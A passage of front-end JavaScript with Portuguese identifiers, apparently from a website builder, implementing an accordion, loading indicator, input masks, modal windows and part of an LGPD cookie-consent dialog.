            if (!resultados) return 0;
            const a = parseFloat(resultados[1]),
                b = parseFloat(resultados[2]);
            let graus = Math.atan2(b, a) * (180 / Math.PI);
            return graus %= 360, graus < 0 && (graus += 360), parseFloat(graus.toFixed(2))
        },
        calcularAjuste: function(angulo, tamanhoConteudo) {
            let radianos = angulo * Math.PI / 180;
            return {
                deltaX: Math.sin(radianos) * tamanhoConteudo / 2 * -1,
                deltaY: (1 - Math.cos(radianos)) * tamanhoConteudo / 2 * -1
            }
        }
    };
window.addEventListener("load", (function() {
    GAccordion.instalar()
}), !1), window.addEventListener("resize", (function() {
    const elementos = document.querySelectorAll(".gac-movendo");
    if (elementos)
        for (var i = 0; i < elementos.length; i++) elementos[i].classList.remove("gac-movendo");
    gac_timeout_resize && clearTimeout(gac_timeout_resize);
    const largura = window.innerWidth;
    gac_timeout_resize = setTimeout((function() {
        largura == window.innerWidth && GAccordion.resize()
    }), 50)
}), !1);
var carregando = !1,
    GLoading = {
        instalar: function() {
            var gl = document.querySelector("#gloading");
            if (null == gl || null == gl) {
                var gl_loading = document.createElement("div");
                gl_loading.id = "gloading", gl_loading.className = "gloading_esconder", gl_loading.innerHTML = "<span></span>", document.body.appendChild(gl_loading)
            }
        },
        carregar: function(configuracao) {
            0 == configuracao.hasOwnProperty("ativar") && (configuracao.ativar = !1), 1 != configuracao.ativar && 0 != configuracao.ativar && (configuracao.ativar = !1), 0 == configuracao.hasOwnProperty("tempo") && (configuracao.tempo = 0), 0 == configuracao.hasOwnProperty("tipo") && (configuracao.tipo = "barra"), "barra" != configuracao.tipo && "tela" != configuracao.tipo && (configuracao.tipo = "barra");
            var gl = document.querySelector("#gloading");
            null != gl && null != gl && (1 == configuracao.ativar && GLoading.carregar_mostrar(gl, configuracao), 0 != configuracao.ativar && 0 == configuracao.tempo || GLoading.carregar_esconder(gl, configuracao))
        },
        carregar_mostrar: function(gl, configuracao) {
            carregando = !0, gl.classList.add("gloading_" + configuracao.tipo + "_carregando")
        },
        carregar_esconder: function(gl, configuracao) {
            ! function(gl, configuracao) {
                configuracao.tempo > 0 ? setTimeout((function() {
                    gl.classList.contains("gloading_tela_carregando") && gl.classList.remove("gloading_tela_carregando"), gl.classList.contains("gloading_barra_carregando") && gl.classList.remove("gloading_barra_carregando"), carregando = !1
                }), configuracao.tempo) : (gl.classList.contains("gloading_tela_carregando") && gl.classList.remove("gloading_tela_carregando"), gl.classList.contains("gloading_barra_carregando") && gl.classList.remove("gloading_barra_carregando"), carregando = !1)
            }(gl, configuracao)
        }
    };
$((function() {
    $("body").on("click", ".check .check-borda, .check .check-texto", (function(evento) {
        var check = $(this).closest(".check"),
            check_borda = check.find(".check-borda"),
            campo = check.closest(".admin_campos-campo").find(".admin_campo");
        check.hasClass("check_selecionado") ? (check.removeClass("check_selecionado"), check_borda.html("")) : (check.addClass("check_selecionado"), check_borda.addClass("check-borda_efeito").html("<span class='check-borda-bolinha'></span>"));
        var valores = "",
            opcoes = check.closest(".checks").find(".check_selecionado");
        opcoes.length && (opcoes.each((function() {
            valores += $(this).attr("id") + ","
        })), valores = valores.substr(0, valores.length - 1)), campo.val(valores).trigger("change"), ValidacaoCampos(campo), setTimeout((function() {
            check_borda.removeClass("check-borda_efeito")
        }), 200)
    }))
}));
var GFM = {
        instalar: function(configuracao) {
            0 == configuracao.hasOwnProperty("elemento") && (configuracao.elemento = ""), 0 == configuracao.hasOwnProperty("mascara") && (configuracao.mascara = ""), 0 == configuracao.hasOwnProperty("placeholder") && (configuracao.placeholder = "");
            for (var elementos = document.querySelectorAll(configuracao.elemento), i = 0; i < elementos.length; i++) ! function(configuracao, elemento) {
                null != elemento && (void 0 !== elemento.dataset.gfm_mascara && null !== elemento.dataset.gfm_mascara && (configuracao.mascara = elemento.dataset.gfm_mascara), void 0 !== elemento.dataset.gfm_placeholder && null !== elemento.dataset.gfm_placeholder && (configuracao.placeholder = elemento.dataset.gfm_placeholder), elemento.addEventListener ? (elemento.addEventListener("focusin", (function(evento) {
                    GFM.campo_focusin(configuracao, elemento, evento)
                })), elemento.addEventListener("focusout", (function(evento) {
                    GFM.campo_focusout(configuracao, elemento, evento)
                })), elemento.addEventListener("input", (function(evento) {
                    GFM.campo_digitar(configuracao, elemento, evento)
                }))) : elemento.attachEvent && (elemento.attachEvent("onfocusin", (function(evento) {
                    GFM.campo_focusin(configuracao, elemento, evento)
                })), elemento.attachEvent("onfocusout", (function(evento) {
                    GFM.campo_focusout(configuracao, elemento, evento)
                })), elemento.attachEvent("oninput", (function(evento) {
                    GFM.campo_digitar(configuracao, elemento, evento)
                }))))
            }(configuracao, elementos[i])
        },
        campo_focusin: function(configuracao, elemento, evento) {
            elemento.placeholder ? elemento.dataset.gfm_placeholder_anterior = elemento.placeholder : elemento.dataset.gfm_placeholder_anterior = " ", configuracao.placeholder && (elemento.placeholder = configuracao.placeholder), elemento.maxLength = configuracao.mascara.length
        },
        campo_focusout: function(configuracao, elemento, evento) {
            elemento.value.length < configuracao.mascara.replace("9", "").replace("Z", "").replace("D", "").replace("?", "").length && (elemento.value = ""), elemento.dataset.gfm_placeholder_anterior && (elemento.placeholder = elemento.dataset.gfm_placeholder_anterior)
        },
        campo_digitar: function(configuracao, elemento, evento) {
            if (null != evento.data) {
                var tecla_codigo = evento.data.charCodeAt(0);
                if (8 !== tecla_codigo && 46 !== tecla_codigo && 16 !== tecla_codigo && 17 !== tecla_codigo && 18 !== tecla_codigo && 37 !== tecla_codigo && 38 !== tecla_codigo && 39 !== tecla_codigo && 40 !== tecla_codigo) {
                    evento.preventDefault(), evento.stopPropagation();
                    var texto = elemento.value,
                        posicionar_cursor = !1;
                    if ("number" == typeof elemento.selectionStart && "number" == typeof elemento.selectionEnd) {
                        var selecao_inicio = elemento.selectionStart,
                            selecao_fim = elemento.selectionEnd;
                        selecao_inicio == selecao_fim && elemento.value.length == selecao_fim || (posicionar_cursor = !0)
                    }
                    for (var texto_tamanho = texto.length, texto_novo = "", caractere = "", numero_mascara = 0, numero_texto = 0; numero_mascara < configuracao.mascara.length; ++numero_mascara) {
                        switch (caractere = texto.charAt(numero_texto), configuracao.mascara.charAt(numero_mascara)) {
                            case "0":
                            case "9":
                                /\d/.test(caractere) && (texto_novo += caractere), ++numero_texto;
                                break;
                            case "A":
                            case "Z":
                                /[a-z]/i.test(caractere) && (texto_novo += caractere), ++numero_texto;
                                break;
                            case "C":
                            case "D":
                                /[a-z0-9]/i.test(caractere) && (texto_novo += caractere), ++numero_texto;
                                break;
                            case "X":
                            case "?":
                                texto_novo += caractere, ++numero_texto;
                                break;
                            default:
                                texto_novo += configuracao.mascara.charAt(numero_mascara), configuracao.mascara.charAt(numero_mascara) == texto.charAt(numero_mascara) ? ++numero_texto : posicionar_cursor && numero_texto + 1 == selecao_inicio && ++selecao_inicio
                        }
                        if (numero_texto == texto_tamanho) break
                    }
                    elemento.value = texto_novo, posicionar_cursor && elemento.setSelectionRange && elemento.setSelectionRange(selecao_inicio, selecao_inicio)
                }
            }
        }
    },
    gm_quantidade = 0;

function AbrirGM(id_gm, componente, configuracao) {
    var z_index_fundo = 999,
        z_index_caixa = 1e3;
    $("#gpc-menu").length && (z_index_fundo = 999999999999902, z_index_caixa = 999999999999903);
    var gm_conteudos = "";
    configuracao.gm.conteudos && $.each(configuracao.gm.conteudos, (function(classe, div) {
        div.conteudo && (gm_conteudos += "<div class='" + componente + "-" + classe + "' " + div.extras + " style='" + div.estilos + "'>" + div.conteudo + "</div>")
    }));
    var gm_fundo_conteudos = "";
    configuracao.gm.conteudos && $.each(configuracao.gm_fundo.conteudos, (function(classe, div) {
        div.conteudo && (gm_fundo_conteudos += "<div class='" + componente + "_fundo-" + classe + "' " + div.extras + " style='" + div.estilos + "'>" + div.conteudo + "</div>")
    }));
    var scroll = window.scrollY,
        tela_altura = $(window).height();
    "gpc_modal" == componente && $("#gpc-blocos_editor").length && (scroll = document.getElementById("gpc-blocos").scrollTop - $("#gpc-blocos").offset().top, tela_altura = $("#gpc-blocos_editor").height()), "gpc_modal" == componente && $("#gpc-blocos_editor").length ? $("#gpc-blocos_editor").append("<div gm_id='" + id_gm + "' gm_componente='" + componente + "' class='gm_fundo " + id_gm + " " + configuracao.gm_fundo.classes + "' " + configuracao.gm_fundo.extras + " style='z-index:" + (z_index_fundo + gm_quantidade) + ";" + configuracao.gm_fundo.estilos + "'>" + gm_fundo_conteudos + "</div>") : $("body").append("<div gm_id='" + id_gm + "' gm_componente='" + componente + "' class='gm_fundo " + id_gm + " " + configuracao.gm_fundo.classes + "' " + configuracao.gm_fundo.extras + " style='z-index:" + (z_index_fundo + gm_quantidade) + ";" + configuracao.gm_fundo.estilos + "'>" + gm_fundo_conteudos + "</div>"), $("." + id_gm).addClass("gm_fundo_ativo"), $(".gm").length && !$(".gpc_modal").lenght || ("gpc_modal" == componente && $("#gpc-blocos_editor").length ? $("#gpc-blocos_editor").addClass("body_bloquear") : "gpc_modal_popup" == componente ? $("body").addClass("body_bloquear_site") : ($("body").addClass("body_bloquear"), "gpc_modal_imagens" == componente && $("body").css({
        overflow: "hidden"
    })), $("#site").length && "gma_modal" != componente ? $("#site").addClass("site_borrar").css({
        top: -scroll + "px",
        height: $("#site").height() + scroll + ""
    }) : "gpc_modal" == componente && $("#gpc-blocos_editor").length ? $("#gpc-blocos_editor-blocos").addClass("administrador_borrar").css({
        top: -scroll + "px"
    }) : $("#administrador").addClass("administrador_borrar").css({
        top: -scroll + "px"
    })), "gpc_modal" == componente && $("#gpc-blocos_editor").length ? $("#gpc-blocos_editor").append("<div id='" + id_gm + "' gm_componente='" + componente + "' gm_scroll='" + scroll + "' class='gm " + configuracao.gm.classes + "' " + configuracao.gm.extras + " style='z-index:" + (z_index_caixa + gm_quantidade) + ";top:" + tela_altura + "px;" + configuracao.gm.estilos + "'>" + gm_conteudos + "</div>") : "gma_modal" == componente ? $("body").append("<div id='" + id_gm + "' gm_componente='" + componente + "' gm_scroll='" + scroll + "' class='gm gm_efeitos " + configuracao.gm.classes + "' " + configuracao.gm.extras + " style='z-index:" + (z_index_caixa + gm_quantidade) + ";top:" + tela_altura / 100 * 5 + "px;" + configuracao.gm.estilos + "'>" + gm_conteudos + "</div>") : "gpc_modal_popup" == componente ? $("body").append("<div id='" + id_gm + "' gm_componente='" + componente + "' gm_scroll='" + scroll + "' class='gm gm_esconder " + configuracao.gm.classes + "' " + configuracao.gm.extras + " style='z-index:" + (z_index_caixa + gm_quantidade) + ";top:" + (tela_altura + scroll) + "px;" + configuracao.gm.estilos + "'>" + gm_conteudos + "</div>") : $("body").append("<div id='" + id_gm + "' gm_componente='" + componente + "' gm_scroll='" + scroll + "' class='gm gm_esconder " + configuracao.gm.classes + "' " + configuracao.gm.extras + " style='z-index:" + (z_index_caixa + gm_quantidade) + ";top:" + tela_altura + "px;" + configuracao.gm.estilos + "'>" + gm_conteudos + "</div>"), "gma_modal" == componente ? setTimeout((function() {
        $("#" + id_gm).css("opacity", "1"), PosicionarGM(id_gm)
    }), 250) : setTimeout((function() {
        PosicionarGM(id_gm)
    }), 150), window.addEventListener("resize", (function(event) {
        "gpc_modal" != componente && ("gmi" == componente ? PosicionarGM(id_gm, !1) : PosicionarGM(id_gm))
    }))
}

function PosicionarGM(id_gm, efeitos) {
    void 0 !== efeitos && "" !== efeitos || (efeitos = !0);
    var gm = $("#" + id_gm);
    if (gm.length) {
        var tela_altura = $(window).height(),
            tela = ($(window).width(), window.scrollY);
        if ($(".gm").length > 1 && (tela = 0), "gpc_modal" == gm.attr("gm_componente")) {
            tela = document.getElementById("gpc-blocos").scrollTop, tela_altura = $("#gpc-blocos_editor").height(), gm.find(".gpc_modal-centro").removeAttr("style");
            var gm_fundo = $("." + id_gm),
                height = 20;
            $("." + gpc_controle.classe_bloco).each((function() {
                height += $(this).height()
            })), gm_fundo.css({
                height: height + "px"
            })
        }
        if ("gpc_modal_formulario" == gm.attr("gm_componente") && gm.find(".gpc_modal_formulario-centro").removeAttr("style"), "gml" == gm.attr("gm_componente") && gm.find(".gml-centro").removeAttr("style"), "gmf" == gm.attr("gm_componente") && gm.find(".gmf-centro").removeAttr("style"), "gm_configurar_dns_completo" == gm.attr("gm_componente") && gm.find(".gm_configurar_dns_completo-centro").removeAttr("style"), "guo" == gm.attr("gm_componente") && gm.find(".guo-passos").removeAttr("style"), "gsp" == gm.attr("gm_componente") && gm.find(".gmf-opcoes").removeAttr("style"), "gpc_modal_imagens" == gm.attr("gm_componente") && gm.find(".gpc_modal_imagens-centro, .gpc_modal_imagens-centro-pastas, .gpc_modal_imagens-centro-fotos").removeAttr("style"), "gmi" == gm.attr("gm_componente")) {
            var imagem = CalcularGMI(gmi_elemento.elemento);
            gmi_caixa.elemento && (gmi_caixa.elemento.css({
                width: imagem.largura + "px",
                height: imagem.altura + "px"
            }), gmi_caixa_imagem.elemento.css({
                width: imagem.largura + "px",
                height: imagem.altura + "px"
            }))
        }
        "gmi_informacoes" == gm.attr("gm_componente") && gm.find(".gmi_informacoes-centro").removeAttr("style"), "gmi_comentarios" == gm.attr("gm_componente") && gm.find(".gmi_comentarios-centro").css("height", "100%");
        gm.width();
        var gm_altura = 0;
        if ("gpc_modal_imagens" == gm.attr("gm_componente") || "gml" == gm.attr("gm_componente")) gm_altura = tela_altura;
        else if ("gpc_modal_popup" == gm.attr("gm_componente") || "gpc_modal" == gm.attr("gm_componente")) {
            "gpc_modal_popup" == gm.attr("gm_componente") && (tela = 0), gm_altura = $(".gpc_modal").height();
            gm_fundo = $("." + id_gm), height = 20;
            "gpc_modal_popup" == gm.attr("gm_componente") ? (gm_altura = $(".gpc_modal_popup-centro").height(), $(".gpc-b").each((function() {
                height += $(this).height()
            }))) : $("." + gpc_controle.classe_bloco).each((function() {
                height += $(this).height()
            })), gm_altura >= tela_altura ? ($("#site").css({
                height: gm_altura + Math.abs(parseFloat($("#site").css("top"))) + 70 + "px"
            }), gm_fundo.css({
                height: gm_altura + 70 + "px"
            })) : ($("#site").css({
                height: tela_altura + Math.abs(parseFloat($("#site").css("top"))) + "px"
            }), gm_altura + 20 >= gm_fundo.height() - 10 ? gm_fundo.css({
                height: tela_altura + 10 + "px"
            }) : gm_fundo.css({
                height: tela_altura + "px"
            }))
        } else "gpc_modal_formulario" == gm.attr("gm_componente") ? gm_altura = $(".gpc_modal_formulario").height() : "gma_modal" == gm.attr("gm_componente") ? gm_altura = $("#gm-gpages_modal").height() : gm.children().each((function() {
            gm_altura += $(this).outerHeight(!0)
        }));
        gm_altura >= tela_altura ? ("gpc_modal_formulario" == gm.attr("gm_componente") && gm.find(".gpc_modal_formulario-centro").css({
            height: $(".gpc_modal_formulario").height() + "px"
        }), "gpc_modal" == gm.attr("gm_componente") && gm.find(".gpc_modal-centro").css({
            height: $(".gpc_modal").height() + "px"
        }), "gpc_modal_popup" == gm.attr("gm_componente") && gm.find(".gpc_modal_popup-centro").css({
            height: $(".gpc_modal_popup").height() + "px"
        }), "gml" == gm.attr("gm_componente") && (tela += 20, gm.find(".gml-centro, .gml-opcoes-lista-lateral, .gml-opcoes-lista-opcoes").css({
            height: tela_altura - gm.find(".gml-topo").outerHeight() - 50 + "px"
        })), "gmf" == gm.attr("gm_componente") && gm.find(".gmf-centro").css({
            height: tela_altura - (gm.find(".gmf-topo").outerHeight() + gm.find(".gmf-rodape").outerHeight()) - 20 + "px"
        }), "gm_configurar_dns_completo" == gm.attr("gm_componente") && gm.find(".gm_configurar_dns_completo-centro").css({
            height: tela_altura - (gm.find(".gm_configurar_dns_completo-topo").outerHeight() + gm.find(".gm_configurar_dns_completo-rodape").outerHeight()) - 20 + "px"
        }), "gpc_modal_imagens" == gm.attr("gm_componente") && (tela += 50, gm.find(".gpc_modal_imagens-centro, .gpc_modal_imagens-centro-pastas, .gpc_modal_imagens-centro-fotos").css({
            height: tela_altura - gm.find(".gpc_modal_imagens-topo").outerHeight() - 120 + "px"
        })), "guo" == gm.attr("gm_componente") && gm.find(".guo-passos").css({
            height: gm_altura - (gm_altura - tela_altura) - 96 + "px"
        }), "gsp" == gm.attr("gm_componente") && gm.find(".gsp-opcoes").css({
            height: tela_altura - (gm.find(".gsp-topo").outerHeight() + gm.find(".gsp-rodape").outerHeight()) - 20 + "px"
        }), "gmi_informacoes" == gm.attr("gm_componente") && gm.find(".gmi_informacoes-centro").css({
            height: tela_altura - gm.find(".gmi_informacoes-topo").outerHeight() - 20 + "px"
        }), "gmi_comentarios" == gm.attr("gm_componente") && gm.find(".gmi_comentarios-centro").css({
            height: tela_altura - (gm.find(".gmi_comentarios-topo").outerHeight() + gm.find(".gmi_comentarios-rodape").outerHeight()) - 20 + "px"
        }), efeitos ? gm.hasClass("gm_efeitos") || gm.addClass("gm_efeitos") : gm.hasClass("gm_efeitos") && gm.removeClass("gm_efeitos"), "gpc_modal_popup" == gm.attr("gm_componente") ? setTimeout((function() {
            gm.css({
                top: tela + 10 + "px"
            }).removeClass("gm_esconder"), $("." + id_gm).css({
                overflow: ""
            })
        }), 25) : "gma_modal" == gm.attr("gm_componente") ? setTimeout((function() {
            gm.css({
                top: tela + "px"
            }).removeClass("gm_esconder")
        }), 25) : setTimeout((function() {
            gm.css({
                top: tela + 10 + "px"
            }).removeClass("gm_esconder"), "gpc_modal" == gm.attr("gm_componente") && "object" == typeof gpc_controle.elementos_iniciados[id_gm] && Object.keys(gpc_controle.elementos_iniciados).length && $.each(gpc_controle.elementos_iniciados, (function(i, elemento_iniciado) {
                "function" == typeof gpc_controle.elementos_iniciados[i].updateRect && gpc_controle.elementos_iniciados[i].updateRect()
            }))
        }), 25)) : ("gpc_modal_imagens" == gm.attr("gm_componente") && gm.find(".gpc_modal_imagens-centro, .gpc_modal_imagens-centro-pastas, .gpc_modal_imagens-centro-fotos").css({
            height: gm_altura - gm.find(".gpc_modal_imagens-topo").outerHeight() - 120 + "px"
        }), "gml" == gm.attr("gm_componente") && gm.find(".gml-centro, .gml-opcoes-lista-lateral, .gml-opcoes-lista-opcoes").css({
            height: tela_altura - gm.find(".gml-topo").outerHeight() - 50 + "px"
        }), efeitos ? gm.hasClass("gm_efeitos") || gm.addClass("gm_efeitos") : gm.hasClass("gm_efeitos") && gm.removeClass("gm_efeitos"), "gpc_modal_popup" == gm.attr("gm_componente") ? setTimeout((function() {
            gm.css({
                top: (tela_altura - gm_altura) / 2 + tela + "px",
                bottom: "initial"
            }).removeClass("gm_esconder"), $("." + id_gm).css({
                overflow: ""
            })
        }), 25) : setTimeout((function() {
            gm.css({
                top: (tela_altura - gm_altura) / 2 + tela + "px",
                bottom: "initial"
            }).removeClass("gm_esconder"), "gpc_modal" == gm.attr("gm_componente") && "object" == typeof gpc_controle.elementos_iniciados[id_gm] && gpc_controle.elementos_iniciados[id_gm].updateRect()
        }), 25))
    }
}

function FecharGM(id_gm) {
    var gm = $("#" + id_gm);
    if (gm.length) {
        var componente = gm.attr("gm_componente");
        "gpc_modal_formulario" == componente && MostrarPreview(!1), "gm-plano_alteracao_pagamento" != gm.attr("id") && "gm-plano_alteracao" != gm.attr("id") && "gm-plano_contratou" != gm.attr("id") || (editou = !1, editou_caixa = !1, GLoading.carregar({
            ativar: !1
        }), document.location.reload()), "gpc_modal" == gm.attr("gm_componente") && "object" == typeof gpc_controle.elementos_iniciados[id_gm] && (gpc_controle.elementos_iniciados[id_gm].destroy(), delete gpc_controle.elementos_iniciados[id_gm]);
        var gm_fundo = $("." + id_gm),
            tela = window.scrollY,
            tela_altura = $(window).height();
        "gpc_modal" == componente && (tela_largura = $("#gpc-blocos_editor").width(), tela = document.getElementById("gpc-blocos").scrollTop), gm.hasClass("gm_efeitos") || gm.addClass("gm_efeitos"), "gma_modal" == componente ? gm.css({
            opacity: "0"
        }) : gm.css({
            top: tela_altura + tela + "px"
        }), setTimeout((function() {
            gm_fundo.removeClass("gm_fundo_ativo")
        }), 100), setTimeout((function() {
            if (1 == $(".gm_fundo").length)
                if ("gpc_modal" == componente) {
                    $("." + gpc_controle.classe_elemento_adicionar + '[gpc_tipo="bloco"]').removeClass("esconder");
                    var elemento_original = $(".gpc_modal").attr("gpc_id_elemento");
                    "" != gpc_controle.elementos_selecionados.elementos_resize && (gpc_controle.elementos_selecionados = {
                        elementos: {},
                        elementos_resize: "",
                        total: 0,
                        helper: {
                            largura: 0,
                            altura: 0,
                            left_original: "",
                            top_original: "",
                            elemento_left_original: "",
                            elemento_top_original: "",
                            scrollTop: $("#gpc-blocos").offset().top,
                            scrollLeft: $("#gpc-blocos").scrollLeft()
                        }
                    }, $("#" + gpc_controle.classe_elementos_selecionados).remove(), $(".ui-selected").removeClass("ui-selected")), setTimeout((function() {
                        $("#elementos_" + elemento_original).addClass("ativo").trigger("click"), gpc_controle.elementos_iniciados.elemento.target = $("#elementos_" + elemento_original)[0], gpc_controle.elementos_iniciados.elemento.updateRect(), gpc_controle.elementos_iniciados.elemento.selfElement.style.opacity = 1
                    }), 300), $("#gpc-blocos_editor-blocos").removeClass("administrador_borrar").removeAttr("style"), $("." + gpc_controle.classe_bloco_configurar).remove()
                } else $("#site").length ? $("#site").closest(".gmf").length ? $("#administrador").removeClass("administrador_borrar").removeAttr("style") : $("#site").removeClass("site_borrar").removeAttr("style") : $("#administrador").removeClass("administrador_borrar").removeAttr("style");
            1 == $(".gm_fundo").length && ("gpc_modal" == componente ? $("#gpc-blocos_editor").removeClass("body_bloquear") : $("body").removeClass("body_bloquear body_bloquear_site")), 1 == $(".gm_fundo").length && ("gpc_modal" == componente ? document.getElementById("gpc-blocos").scrollTop = parseFloat(gm.attr("gm_scroll")) + $("#gpc-blocos").offset().top : window.scroll({
                top: gm.attr("gm_scroll"),
                behavior: "auto"
            })), gm.remove(), gm_fundo.remove(), editou = !1, editou_caixa = !1, GLoading.carregar({
                ativar: !1
            }), "gpc_modal_imagens" == componente && $("body").css({
                overflow: ""
            }), "gpc_modal" == componente && (ElementosBind("todos", "reiniciar"), setTimeout((function() {
                "object" == typeof gpc_controle.elementos_iniciados.elemento && Object.keys(gpc_controle.elementos_iniciados).length && $.each(gpc_controle.elementos_iniciados, (function(i, elemento_iniciado) {
                    "function" == typeof gpc_controle.elementos_iniciados[i].updateRect && gpc_controle.elementos_iniciados[i].updateRect()
                }))
            }), 25))
        }), 200)
    }
}

function PulsarGM(id_gm) {
    $("#" + id_gm).addClass("gm_pulsar"), setTimeout((function() {
        $("#" + id_gm).removeClass("gm_pulsar")
    }), 100)
}
$((function() {
    $("body").on("click", ".gm_fundo", (function() {
        "pulsar" == $(this).attr("gm_fundo_acao") ? PulsarGM($(this).attr("gm_id")) : "fechar" == $(this).attr("gm_fundo_acao") && FecharGM($(this).attr("gm_id"))
    })), $("body").on("click", ".gm_fechar", (function() {
        FecharGM($(this).attr("gm_id"))
    }))
}));
var timeout_resize_slider, GModalApproval = {
        instalar: function(configuracao) {
            0 == configuracao.hasOwnProperty("barra") && (configuracao.barra = ""), "" != configuracao.barra && (null == GModalApproval.preferencias() ? GModalApproval.barra(configuracao) : (GModalApproval.botao(configuracao), GModalApproval.instalar_scripts(configuracao, !1)), setTimeout((function() {
                GModalApproval.posicionar()
            }), 500))
        },

        botao: function(configuracao) {
            var g_lgpd;
            0 == configuracao.barra.hasOwnProperty("editar_consentimento") && (configuracao.barra.editar_consentimento = !0), configuracao.barra.editar_consentimento && null == (g_lgpd = document.getElementById("gpc-lgpd_editar")) && ((g_lgpd = document.createElement("div")).id = "gpc-lgpd_editar", g_lgpd.className = "posicionar gtt-direita gpc-lgpd-cor_" + configuracao.barra.cor + " " + configuracao.barra.classe, g_lgpd.setAttribute("data-gtt", "Preferências de cookies"), document.body.appendChild(g_lgpd), GTooltip.instalar({
                elemento: ".gtt-direita",
                direcao: "direita"
            }), setTimeout((function() {
                GModalApproval.configurar(configuracao)
            }), 300)), setTimeout((function() {
                GModalApproval.posicionar()
            }), 200)
        },
        modal: function(configuracao) {
            GLoading.carregar({
                ativar: !0
            });
            var conteudo = "";
            if (0 == configuracao.hasOwnProperty("textos") && (configuracao.textos = ""), 0 == configuracao.hasOwnProperty("opcoes") && (configuracao.opcoes = ""), "" != configuracao.textos) {
                conteudo += '<div id="gpc_modal_lgpd-titulo">';
                for (var i = 0; i < configuracao.textos.length; i++) "titulo" == configuracao.textos[i].tipo && (conteudo += '<div class="gpc_modal_lgpd-titulo-titulo">' + configuracao.textos[i].texto + "</div>"), "texto" == configuracao.textos[i].tipo && (conteudo += '<div class="gpc_modal_lgpd-titulo-texto">' + configuracao.textos[i].texto + "</div>");
                conteudo += "</div>"
            }
            if ("" != configuracao.opcoes) {
                var cookie = GModalApproval.preferencias();
                for (i = 0; i < configuracao.opcoes.length; i++) 0 == configuracao.opcoes[i].hasOwnProperty("aviso") && (configuracao.opcoes[i].aviso = ""), 0 == configuracao.opcoes[i].hasOwnProperty("titulo") && (configuracao.opcoes[i].titulo = ""), 0 == configuracao.opcoes[i].hasOwnProperty("texto") && (configuracao.opcoes[i].texto = ""), conteudo += '<div class="gpc_modal_lgpd-opcoes">', conteudo += '<div class="gpc_modal_lgpd-opcoes-protecao">', conteudo += '<span class="gpc_modal_lgpd-opcoes-titulo">' + configuracao.opcoes[i].titulo + "</span>", "" != configuracao.opcoes[i].aviso ? conteudo += '<span class="gpc_modal_lgpd-opcoes-aviso">' + configuracao.opcoes[i].aviso + "</span>" : (cookie && (configuracao.opcoes[i].valor = -1 !== cookie.indexOf(configuracao.opcoes[i].id + ":1")), conteudo += '<span id="' + configuracao.opcoes[i].id + '" class="gpc_modal_lgpd-opcoes-selecao' + (configuracao.opcoes[i].valor ? " gpc_modal_lgpd-opcoes-selecao_selecionado" : "") + '"><span class="marcador"></span></span>'), conteudo += "</div>", conteudo += '<div class="gpc_modal_lgpd-opcoes-texto">' + configuracao.opcoes[i].texto + "</div>", conteudo += "</div>"
            }
            AbrirGM("gpc_modal_lgpd_" + ++gm_quantidade, "gpc_modal_popup_lgpd", {
                gm: {
                    conteudos: {
                        topo: {
                            conteudo: "<div id='gpc_modal_popup_lgpd-topo-fechar' class='gpc_modal_popup_lgpd-topo-fechar gpc_modal_popup-fechar icone-fechar'></div>",
                            estilos: "",
                            extras: ""
                        },
                        centro: {
                            conteudo: conteudo += '<div id="gpc_modal_lgpd-confirmar">Confirmar configurações</div>',
                            estilos: "",
                            extras: ""
                        }
                    },
                    classes: "gm_lgpd",
                    estilos: "max-width:420px;",
                    extras: ""
                },
                gm_fundo: {
                    conteudos: {
                        topo: {
                            conteudo: "<div id='gpc_modal_popup-fundo-fechar' class='gpc_modal_popup-fundo-fechar gpc_modal_popup-fechar icone-fechar'></div>"
                        }
                    },
                    classes: "gpc_modal_lgpd-fundo",
                    estilos: "overflow:hidden;",
                    extras: 'gm_fundo_acao="fechar" id="gpc_modal_lgpd-fundo"'
                }
            }), GLoading.carregar({
                ativar: !1
            });
            var lgpd = document.getElementById("gpc-lgpd");
            null == lgpd && (lgpd = document.getElementById("gpc-lgpd_editar")), lgpd.classList.add("posicionar"), lgpd.classList.remove("posicionado"), setTimeout((function() {
                var botao_confirmar = document.getElementById("gpc_modal_lgpd-confirmar");
                null != botao_confirmar && botao_confirmar.addEventListener("click", (function() {
                    GModalApproval.confirmar(configuracao)
                }));
                var fechar1 = document.getElementById("gpc_modal_popup_lgpd-topo-fechar");
                null != fechar1 && fechar1.addEventListener("click", (function() {
                    FecharGM("gpc_modal_lgpd_" + gm_quantidade), GModalApproval.posicionar()
                }));
                var fechar2 = document.getElementById("gpc_modal_popup-fundo-fechar");
                null != fechar2 && fechar2.addEventListener("click", (function() {
                    GModalApproval.posicionar()
                }));
                var fechar3 = document.getElementById("gpc_modal_lgpd-fundo");
                null != fechar3 && fechar3.addEventListener("click", (function() {
                    GModalApproval.posicionar()
                }));
                var opcoes = document.getElementsByClassName("gpc_modal_lgpd-opcoes-selecao");
                if (null != opcoes)
                    for (var i = 0; i < opcoes.length; i++) opcoes[i].addEventListener("click", (function(e) {
                        this.classList.contains("gpc_modal_lgpd-opcoes-selecao_selecionado") ? this.classList.remove("gpc_modal_lgpd-opcoes-selecao_selecionado") : this.classList.add("gpc_modal_lgpd-opcoes-selecao_selecionado")
                    }))
            }), 400)
        },
        posicionar: function() {
            var g_lgpd = document.getElementById("gpc-lgpd");
            null == g_lgpd && (g_lgpd = document.getElementById("gpc-lgpd_editar")), g_lgpd && (g_lgpd.classList.add("posicionado"), g_lgpd.classList.remove("posicionar"))
        },
        configurar: function(configuracao) {
            var botao_editar = document.getElementById("gpc-lgpd_editar");
            botao_editar && (botao_editar.removeEventListener("click", (function() {
                GModalApproval.modal(configuracao)
            }), !1), botao_editar.addEventListener("click", (function() {
                GModalApproval.modal(configuracao)
            })));
            var botao_configurar = document.getElementById("gpc-lgpd_botoes-configurar");
            botao_configurar && (botao_configurar.removeEventListener("click", (function() {
                GModalApproval.modal(configuracao)
            }), !1), botao_configurar.addEventListener("click", (function() {
                GModalApproval.modal(configuracao)
            })));
            var botao_confirmar = document.getElementById("gpc-lgpd_botoes-confirmar");
            botao_confirmar && (botao_confirmar.removeEventListener("click", (function() {
                GModalApproval.confirmarTodos(configuracao)
            }), !1), botao_confirmar.addEventListener("click", (function() {
                GModalApproval.confirmarTodos(configuracao)
            })));
            var botao_fechar = document.getElementById("gpc-lgpd_fechar");
            botao_fechar && (botao_fechar.removeEventListener("click", (function() {
                GModalApproval.cancelarTodos(configuracao)
            }), !1), botao_fechar.addEventListener("click", (function() {
                GModalApproval.cancelarTodos(configuracao)
            })))
        },
        confirmar: function(configuracao) {
            var valor = "o:1",
                elementos = document.getElementsByClassName("gpc_modal_lgpd-opcoes-selecao");
            let editado = !1;
            if (elementos.length)
                for (var i = 0; i < elementos.length; i++)
